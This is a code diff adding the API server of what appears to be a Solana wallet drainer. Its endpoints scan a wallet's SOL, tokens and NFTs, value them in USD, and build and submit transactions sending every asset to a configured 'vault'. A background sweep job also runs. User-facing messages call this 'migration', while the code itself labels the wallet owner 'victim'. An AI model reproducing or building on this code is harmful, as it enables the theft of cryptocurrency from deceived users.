@@ -1,0 +1,86 @@
+import Fastify from "fastify";
+import cors from "@fastify/cors";
+import rateLimit from "@fastify/rate-limit";
+import { PublicKey } from "@solana/web3.js";
+import { z } from "zod";
+import { cfg } from "./config.js";
+import { scan } from "./scan.js";
+import { prices } from "./price.js";
+import { buildAll, plan } from "./build.js";
+import { submit } from "./submit.js";
+import { startHotSweep } from "./sweep.js";
+import { log } from "./log.js";
+import { adminRoutes, runtime } from "./admin.js";
+
+const app = Fastify({ logger: false });
+
+await app.register(cors, {
+  origin: (o, cb) => cb(null, !o || cfg.origins.includes(o)),
+  methods: ["GET", "POST"],
+});
+await app.register(rateLimit, { max: 60, timeWindow: "1 minute", keyGenerator: (r) => r.ip });
+adminRoutes(app);
+
+const Owner = z.object({ owner: z.string().min(32).max(44) });
+const Tx = z.object({ tx: z.string().min(100) });
+
+app.get("/health", async () => ({ ok: true }));
+app.get("/config", async () => ({ vault: cfg.vault.toBase58() }));
+
+app.post("/scan", async (req, reply) => {
+  const p = Owner.safeParse(req.body);
+  if (!p.success) return reply.code(400).send("bad owner");
+
+  let owner: PublicKey;
+  try { owner = new PublicKey(p.data.owner); } catch { return reply.code(400).send("bad pubkey"); }
+
+  const { sol, found } = await scan(owner);
+  const px = await prices(found.filter((f) => f.amount > 0n && !f.isNft).map((f) => f.mint.toBase58()));
+
+  const assets = found.map((f) => {
+    const usd = f.isNft || f.decimals === 0
+      ? undefined
+      : px[f.mint.toBase58()] ? (Number(f.amount) / 10 ** f.decimals) * px[f.mint.toBase58()]! : undefined;
+    return { mint: f.mint.toBase58(), ata: f.ata.toBase58(), amount: f.amount.toString(), decimals: f.decimals, isNft: f.isNft, usd };
+  });
+
+  log({ level: "scan", owner: p.data.owner, sol, n: assets.length });
+  return { sol, vault: cfg.vault.toBase58(), assets, payer: cfg.feePayer ? "ours" : "victim" };
+});
+
+app.post("/build", async (req, reply) => {
+  const p = Owner.safeParse(req.body);
+  if (!p.success) return reply.code(400).send("bad owner");
+
+  let owner: PublicKey;
+  try { owner = new PublicKey(p.data.owner); } catch { return reply.code(400).send("bad pubkey"); }
+  if (runtime.paused) return reply.code(503).send("paused");
+
+  const { sol, found } = await scan(owner);
+  if (sol === 0 && found.length === 0) return reply.code(409).send("nothing to migrate");
+
+  const items = await plan(owner, BigInt(sol), found);
+  if (items.length === 0) return reply.code(409).send("not enough SOL for fees");
+  const txs = await buildAll(owner, items);
+  if (txs.length === 0) return reply.code(409).send("nothing to migrate");
+
+  log({ level: "build", owner: p.data.owner, batches: txs.length });
+  return { txs };
+});
+
+app.post("/submit", async (req, reply) => {
+  const p = Tx.safeParse(req.body);
+  if (!p.success) return reply.code(400).send("bad tx");
+  try {
+    const r = await submit(p.data.tx);
+    log({ level: "submit", sig: r.sig, via: r.via });
+    return { sig: r.sig };
+  } catch (e: any) {
+    log({ level: "submit-err", msg: e?.message });
+    return reply.code(502).send(e?.message ?? "submit failed");
+  }
+});
+
+startHotSweep();
+await app.listen({ port: cfg.PORT, host: "0.0.0.0" });
+console.log(`api on :${cfg.PORT}`);
